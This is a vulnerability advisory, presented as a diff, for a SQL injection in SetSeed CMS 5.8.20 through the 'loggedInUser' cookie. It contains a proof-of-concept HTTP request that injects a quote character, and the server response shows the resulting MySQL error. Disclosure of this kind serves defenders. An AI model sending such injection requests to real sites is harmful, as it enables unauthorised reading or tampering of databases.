@@ -1,0 +1,56 @@
+SetSeed CMS 5.8.20 (loggedInUser) Remote SQL Injection Vulnerability
+
+
+Vendor: SetSeed
+Product web page: http://www.setseed.com
+Affected version: 5.8.20
+
+Summary: SetSeed is a self-hosted CMS which lets you rapidly build
+and deploy complete websites and online stores for your clients.
+
+Desc: SetSeed CMS is vulnerable to SQL injection. A remote attacker
+could send specially-crafted SQL statements to the vulnerable script
+using the cookie input 'loggedInUser', which could allow the attacker
+to view, add, modify or delete information in the back-end database.
+
+
+Tested on: Microsoft Windows XP Pro SP3 (EN)
+           Apache 2.2.21
+           MySQL 5.5.16
+           PHP 5.3.8
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            liquidworm gmail com
+
+
+Advisory ID: ZSL-2011-5053
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2011-5053.php
+
+
+
+02.11.2011
+
+---
+
+
+GET /setseed-hub/ HTTP/1.1
+Cookie: loggedInKey=PYNS9QVWLEBG1E7C9UFCT674DYNW9YJ; loggedInUser=1%27; PHPSESSID=d6qiobigb5204mkuvculibhgd4
+Host: localhost:80
+Connection: Keep-alive
+Accept-Encoding: gzip,deflate
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0)
+
+
+HTTP/1.1 200 OK
+Date: Wed, 02 Nov 2011 15:39:39 GMT
+Server: Apache/2.2.21 (Win32) mod_ssl/2.2.21 OpenSSL/1.0.0e PHP/5.3.8 mod_perl/2.0.4 Perl/v5.10.1
+X-Powered-By: PHP/5.3.8
+Content-Length: 150
+Keep-Alive: timeout=5, max=62
+Connection: Keep-Alive
+Content-Type: text/html
+
+
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the
+right syntax to use near ''1''' at line 1
